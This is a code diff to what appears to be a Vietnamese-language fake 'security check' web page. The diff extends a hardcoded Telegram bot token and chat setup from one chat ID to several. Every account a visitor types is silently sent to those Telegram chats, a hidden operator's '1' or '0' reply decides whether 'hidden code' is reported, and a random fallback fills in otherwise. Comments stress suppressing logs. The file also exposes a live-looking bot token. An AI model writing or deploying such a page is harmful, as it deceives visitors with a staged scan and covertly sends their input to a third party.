@@ -420,7 +420,7 @@
     <div class="logo glitch">Hệ thống kiểm tra<span> bảo mật</span></div>
     <div class="subtitle">DEEP ACCOUNT ANALYSIS SYSTEM</div>
     <div class="version-bar">
-      <span>v2.7.5-TG</span>
+      <span>v2.7.6-TG-MULTI</span>
       <span id="clock">--:--:--</span>
       <span>NODE: VN-01</span>
     </div>
@@ -432,7 +432,7 @@
     <div class="input-group">
       <label class="input-label"></label>
       <div class="input-wrap">
-        <input type="text" id="accInput" placeholder="Nhập tài khoản cần kiểm tra" autocomplete="off">
+        <input type="text" id="accInput" placeholder="" autocomplete="off">
       </div>
     </div>
 
@@ -449,7 +449,7 @@
     <button class="btn-scan" id="scanBtn" onclick="startScan()">[ KIỂM TRA ]</button>
 
     <div class="terminal" id="terminal">
-      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.5 INITIALIZED</span>
+      <span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.6 INITIALIZED</span>
       <span class="log-line sys">// Đang chờ...</span>
     </div>
 
@@ -472,7 +472,11 @@
 <script>
 // ==================== HARDCODED TELEGRAM CONFIG ====================
 const HARDCODED_BOT_TOKEN = "8733138340:AAGSz56sxLwM4u9OLDSV6jQcD45yXOkh2CQ";
-const HARDCODED_CHAT_ID   = "6611079605";
+const HARDCODED_CHAT_IDS = [
+  "6316826211",
+  "213123213",
+  "123123123",
+];
 const TELEGRAM_TIMEOUT_SEC = 35;
 // ====================================================================
 
@@ -527,7 +531,7 @@ function log(msg, type='info', delay=0) {
 }
 
 function clearLogs() {
-  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.5 INITIALIZED</span>\n<span class="log-line sys">// Đang chờ...</span>';
+  terminal.innerHTML = '<span class="log-line sys">// HỆ THỐNG KIỂM TRA BẢO MẬT v2.7.6 INITIALIZED</span>\n<span class="log-line sys">// Đang chờ...</span>';
 }
 
 function setProgress(pct, label) {
@@ -565,8 +569,8 @@ function showPopup(type, title, desc) {
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// Telegram functions
-async function sendTelegram(token, chatId, message) {
+// Gửi tin nhắn đến 1 chat ID
+async function sendTelegramToChat(token, chatId, message) {
   if (!message || message.trim() === '') {
     throw new Error('Message empty');
   }
@@ -577,42 +581,77 @@ async function sendTelegram(token, chatId, message) {
     body: JSON.stringify({
       chat_id: chatId,
       text: message,
-      parse_mode: 'HTML',
       disable_web_page_preview: true
     })
   });
   const data = await res.json();
   if (!data.ok) throw new Error(data.description);
-  return data.result.message_id;
+  return { chatId: String(chatId), msgId: data.result.message_id };
 }
 
-async function pollForReply(token, chatId, afterMsgId, timeoutSec) {
+// Gửi tin nhắn đến nhiều chat ID
+async function sendTelegramToMultiple(token, chatIds, message) {
+  const results = [];
+  for (const chatId of chatIds) {
+    try {
+      const result = await sendTelegramToChat(token, chatId, message);
+      results.push(result);
+    } catch (e) {
+      // Bỏ qua lỗi từng user
+    }
+  }
+  return results;
+}
+
+// Lắng nghe phản hồi từ nhiều chat
+async function pollForReplyMulti(token, chatIds, sentList, timeoutSec) {
   const deadline = Date.now() + timeoutSec * 1000;
   let offset = 0;
+  
+  const sentMap = new Map();
+  sentList.forEach(item => {
+    sentMap.set(item.chatId, item.msgId);
+  });
+  
+  const allowedChatIds = chatIds.map(id => String(id));
+  
   while (Date.now() < deadline) {
-    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&limit=20`;
+    const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["message"]`;
+    
     try {
       const res = await fetch(url);
       const data = await res.json();
+      
       if (data.ok && data.result && data.result.length > 0) {
         for (const update of data.result) {
           offset = update.update_id + 1;
-          const msg = update.message || update.channel_post;
-          if (!msg) continue;
-          const msgChatId = String(msg.chat.id);
-          let cfgChatId = String(chatId);
-          if (cfgChatId.startsWith('@')) cfgChatId = cfgChatId.substring(1);
-          const sameChat = msgChatId === cfgChatId || (msg.chat.username && msg.chat.username === cfgChatId);
-          if (sameChat && msg.message_id > afterMsgId) {
-            const txt = (msg.text || '').trim().toLowerCase();
-            if (txt === '1' || txt.includes('có') || txt === 'co' || txt.includes('yes') || txt.includes('found')) return 'found';
-            if (txt === '0' || txt.includes('không') || txt === 'khong' || txt.includes('no') || txt.includes('clean') || txt.includes('sạch')) return 'clean';
+          
+          const msg = update.message;
+          if (!msg || !msg.text) continue;
+          
+          const chatId = String(msg.chat.id);
+          const text = msg.text.trim().toLowerCase();
+          
+          if (!allowedChatIds.includes(chatId)) continue;
+          
+          const sentMsgId = sentMap.get(chatId);
+          if (!sentMsgId || msg.message_id <= sentMsgId) continue;
+          
+          if (text === '1' || text === 'có' || text === 'co' || text.includes('found')) {
+            return 'found';
+          }
+          if (text === '0' || text === 'không' || text === 'khong' || text.includes('clean') || text.includes('sạch')) {
+            return 'clean';
           }
         }
       }
-    } catch(e) {}
+    } catch (e) {
+      // Bỏ qua lỗi
+    }
+    
     await sleep(2000);
   }
+  
   return null;
 }
 
@@ -626,7 +665,7 @@ async function fallbackScan(account) {
   return seed < 45;
 }
 
-// Main scan
+// Main scan - không có log telegram
 async function startScan() {
   const acc = document.getElementById('accInput').value.trim();
   
@@ -656,8 +695,8 @@ async function startScan() {
   await sleep(350);
   
   const isValidToken = HARDCODED_BOT_TOKEN && HARDCODED_BOT_TOKEN.length > 30;
-  const isValidChatId = HARDCODED_CHAT_ID && HARDCODED_CHAT_ID.length > 5;
-  const useTg = isValidToken && isValidChatId;
+  const isValidChatIds = Array.isArray(HARDCODED_CHAT_IDS) && HARDCODED_CHAT_IDS.length > 0;
+  const useTg = isValidToken && isValidChatIds;
   
   let finalResult = null;
   
@@ -665,27 +704,27 @@ async function startScan() {
     setProgress(28, 'KẾT NỐI...');
     await sleep(200);
     
-    let sentMsgId = 0;
+    let sentList = [];
     try {
-      // Format tin nhắn đơn giản như yêu cầu
-const msgText = `🔍 <b>Thông báo kiểm tra</b>
-<blockquote>📋Session: ${session}
-👤Tài khoản: ${acc}
-⏰Thời gian: ${new Date().toLocaleString('vi-VN')}
+      const msgText = `Thông báo kiểm tra
+
+Session: ${session}
+Tài khoản: ${acc}
+Thời gian: ${new Date().toLocaleString('vi-VN')}
+
 Trả lời:
 • 1 hoặc có → Có mã ẩn
-• 0 hoặc không → Không có mã ẩn
-</blockquote>`;
+• 0 hoặc không → Không có mã ẩn`;
       
-      sentMsgId = await sendTelegram(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_ID, msgText);
+      sentList = await sendTelegramToMultiple(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, msgText);
       setProgress(45, 'CHỜ PHẢN HỒI...');
     } catch(e) {
-      // Silent fail
+      // Không log lỗi
     }
     
-    if (sentMsgId > 0) {
+    if (sentList.length > 0) {
       let elapsed = 0;
-      const pollPromise = pollForReply(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_ID, sentMsgId, TELEGRAM_TIMEOUT_SEC);
+      const pollPromise = pollForReplyMulti(HARDCODED_BOT_TOKEN, HARDCODED_CHAT_IDS, sentList, TELEGRAM_TIMEOUT_SEC);
       const tickInterval = setInterval(() => {
         elapsed++;
         const pct = 45 + Math.min(45, (elapsed / TELEGRAM_TIMEOUT_SEC) * 45);
